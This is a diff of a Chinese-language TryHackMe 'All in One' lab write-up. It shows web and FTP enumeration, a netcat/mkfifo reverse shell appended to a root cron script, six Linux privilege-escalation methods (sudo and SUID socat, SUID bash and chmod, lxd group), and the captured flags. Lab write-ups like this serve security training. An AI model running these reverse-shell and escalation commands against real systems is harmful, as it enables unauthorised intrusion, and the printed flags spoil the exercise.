@@ -1,7 +1,7 @@
-#服务发现
+#  服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/allinone]
-└─# nmap -sV -Pn 10.10.167.81     
+└─#  nmap -sV -Pn 10.10.167.81     
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-28 05:58 EDT
 Nmap scan report for 10.10.167.81
@@ -16,16 +16,16 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
 ```
-#ftp服务枚举
+#  ftp服务枚举
 ftp可以匿名登录
 无任何文件发现
 也不可以上传文件到ftp
 用其他用户名登录ftp会提示```This FTP server is anonymous only.```
 
-#爆破目录
+#  爆破目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.167.81                
+└─#  python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.167.81                
 
  _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
@@ -50,10 +50,10 @@ Task Completed
  ```http://10.10.167.81/wordpress/```是一个wordpress站点
 
 
-#wordpress挖掘
+#  wordpress挖掘
 ```
 ┌──(root💀kali)-[~/tryhackme/allinone]
-└─# wpscan --url http://10.10.167.81/wordpress/
+└─#  wpscan --url http://10.10.167.81/wordpress/
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -175,10 +175,10 @@ Interesting Finding(s):
 
 首页出现一个账号信息：```elyana```。经登陆测试验证是合法账号。确认wordpress版本5.5.1
 
-#爆破wordpress站点目录
+#  爆破wordpress站点目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.167.81/wordpress
+└─#  python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.167.81/wordpress
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -201,7 +201,7 @@ Task Completed
 wp-includes可以看到文件list
 
 
-#爆破/hackathons，无发现
+#  爆破/hackathons，无发现
 
 ```http://10.10.167.81/hackathons```里显示了一句话
 
@@ -229,10 +229,10 @@ Vinegar是一种加密算法,中文名叫```维吉尼亚密码```,以下引用�
 
 ```
 ──(root💀kali)-[~/tryhackme/allinone]
-└─# nc -lnvp 1234                       
+└─#  nc -lnvp 1234                       
 listening on [any] 1234 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.167.81] 59420
-Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+Linux elyana 4.15.0-118-generic # 119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  07:44:14 up  2:10,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -266,39 +266,39 @@ $
 
 传linpeas到靶机，发现一个root的定时任务有可写权限，可以直接跳过横向提权到root，另外还有几个提权方法，这里一一介绍
 
-#提权方法1：Cron
+#  提权方法1：Cron
 思路是把一个反弹shell写到cron任务里，开启监听等待任务执行
 需要注意这台靶机很多反弹方法都不能使用，需要一一测试
 这里用的是```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f```
-参考[这里的方法](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
+参考[这里的方法](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md# bash-tcp)
 
 ```
 $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f" >> /var/backups/script.sh
 $ cat /var/backups/script.sh
-#!/bin/bash
+# !/bin/bash
 
-#Just a test script, might use it later to for a cron task 
+# Just a test script, might use it later to for a cron task 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f
 $ 
 ```
 
-#开启监听，拿到user和root的flag,需要base64解密
+#  开启监听，拿到user和root的flag,需要base64解密
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
+└─#  nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
 listening on [any] 4242 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.167.81] 48544
 /bin/sh: 0: can't access tty; job control turned off
-# id
+#  id
 uid=0(root) gid=0(root) groups=0(root)
-# cat /home/elyana/user.txt
+#  cat /home/elyana/user.txt
 VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
-# cat /root/root.txt
+#  cat /root/root.txt
 VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
-# 
+#  
 ```
 
-#提权方法2 sudo滥用：socat
+#  提权方法2 sudo滥用：socat
 因为这台机器只安装了python3，所以我们要用python3切换tty
 
 ```python3 -c "import pty;pty.spawn('/bin/bash')"```
@@ -328,7 +328,7 @@ password: E@syR18ght
 我们登陆到elyana的账号，查看elyana的sudo权限
 ```
 ┌──(root💀kali)-[~]
-└─# ssh elyana@10.10.167.81
+└─#  ssh elyana@10.10.167.81
 elyana@10.10.167.81's password: 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
@@ -403,7 +403,7 @@ root
 
 
 
-#提权方法3 SUID：socat
+#  提权方法3 SUID：socat
 
 socat同时也是一个SUID,我们依据SUID提权
 
@@ -418,29 +418,29 @@ socat同时也是一个SUID,我们依据SUID提权
 
 ```
 ┌──(root💀kali)-[~]
-└─# socat file:`tty`,raw,echo=0 tcp-listen:12345
+└─#  socat file:`tty`,raw,echo=0 tcp-listen:12345
 /bin/sh: 0: can't access tty; job control turned off
-# id
+#  id
 uid=0(root) gid=0(root) groups=0(root)
-# whoami
+#  whoami
 root
-# 
+#  
 
 ```
 
-#提权方法4 SUID:bash
+#  提权方法4 SUID:bash
 
 ```
 -bash-4.4$ /bin/bash -p
-bash-4.4# id
+bash-4.4#  id
 uid=1000(elyana) gid=1000(elyana) euid=0(root) egid=0(root) groups=0(root),4(adm),27(sudo),108(lxd),1000(elyana)
-bash-4.4# whoami
+bash-4.4#  whoami
 root
-bash-4.4# 
+bash-4.4#  
 
 ```
 
-#提权方法5 SUID:chmod
+#  提权方法5 SUID:chmod
 这个命令的思路是通过chmod修改一些敏感文件的权限，使得这些文件可读可写，从而提升自己的权限
 
 
@@ -456,7 +456,7 @@ bash-4.4#
 
 ```
 
-#提权方法6 lxd组用户提权
+#  提权方法6 lxd组用户提权
 这个方法的操作流程在之前我的[这台靶机](https://www.jianshu.com/p/d23ae6bba086)里有详细记录
 
 ```
@@ -482,19 +482,19 @@ bash-4.4$ lxc config device add ignite mydevice disk source=/ path=/mnt/root rec
 Device mydevice added to ignite
 bash-4.4$  lxc start ignite
 bash-4.4$ lxc exec ignite /bin/sh
-~ # id
+~ #  id
 uid=0(root) gid=0(root)
-~ # cd /mnt/root/
-/mnt/root # ls
+~ #  cd /mnt/root/
+/mnt/root #  ls
 bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            sys             usr             vmlinuz
 boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             tmp             var             vmlinuz.old
-/mnt/root # cd root/
-/mnt/root/root # pwd
+/mnt/root #  cd root/
+/mnt/root/root #  pwd
 /mnt/root/root
-/mnt/root/root # ls
+/mnt/root/root #  ls
 root.txt
-/mnt/root/root # cat root.txt
+/mnt/root/root #  cat root.txt
 VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
-/mnt/root/root # 
+/mnt/root/root #  
 ```
 这里列出了6种提权的方法，但我感觉应该还有其他方法，这里就不再测试了。如果你知道其他提权的思路，请留言告诉我： )
